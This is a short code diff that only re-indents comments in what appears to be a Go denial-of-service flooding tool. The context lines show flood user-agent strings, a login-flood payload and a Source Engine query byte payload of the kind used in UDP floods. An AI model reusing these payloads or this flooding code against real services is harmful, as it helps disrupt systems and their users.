@@ -6,7 +6,7 @@ import (
 )
 
 /*
-GET flood Agents.
+	GET flood Agents.
 */
 var httpAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
@@ -32,7 +32,7 @@ var httpAgents = []string{
 }
 
 /*
-POST login flood payloads.
+	POST login flood payloads.
 */
 var (
 	postLogin, _ = json.Marshal(map[string]string{
@@ -47,7 +47,7 @@ var (
 )
 
 /*
-Other payloads.
+	Other payloads.
 */
 const (
 	VSE_PAYLOAD   = "\xff\xff\xff\xff\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79"
@@ -56,7 +56,7 @@ const (
 )
 
 /*
-Increase more size of a Jumbo flood.
+	Increase more size of a Jumbo flood.
 */
 const (
 	APPLE = "https://www.apple.com"
